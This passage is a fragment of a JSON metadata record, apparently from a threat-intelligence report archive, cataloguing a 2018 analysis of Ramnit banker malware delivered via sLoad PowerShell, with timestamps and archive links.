        "2018-08-05 - Let's Learn- Diving into the Latest -Ramnit- Banker Malware via -sLoad- PowerShell.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536118,
    "ts_updated_at": 1743041151,
    "ts_creation_date": 1653711164,
    "ts_modification_date": 1653711164,
    "files": {
        "pdf": "https://archive.orkl.eu/86a44c2adf678d33eccacdceeda5ff0641bcc942.pdf",
        "text": "https://archive.orkl.eu/86a44c2adf678d33eccacdceeda5ff0641bcc942.txt",
        "img": "https://archive.orkl.eu/86a44c2adf678d33eccacdceeda5ff0641bcc942.jpg"
    }
}